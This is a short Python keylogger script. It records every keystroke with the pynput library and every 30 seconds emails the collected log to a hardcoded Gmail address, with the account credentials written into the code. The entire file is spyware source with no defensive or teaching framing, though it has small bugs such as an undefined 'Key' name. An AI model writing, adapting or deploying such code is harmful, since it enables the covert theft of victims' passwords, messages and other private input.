import pynput.keyboard as kb
import smtplib
import threading


log = ""

def callback_Function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
        #log += str(key.char)
    except AttributeError:
        if key == Key.space:
            log += " "
        else:
            log = log + str(key)

    #print(log)

def sendEmail(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread ---threading
def threadFunction():
    global log
    sendEmail("edonredforyou123@gmail.com", "root@kali", log)
    log = ""
    timerObject = threading.Timer(30,threadFunction)
    timerObject.start()
#sendEmail()
keyloggerListener=kb.Listener(on_press=callback_Function)
with keyloggerListener:
	threadFunction()
	keyloggerListener.join()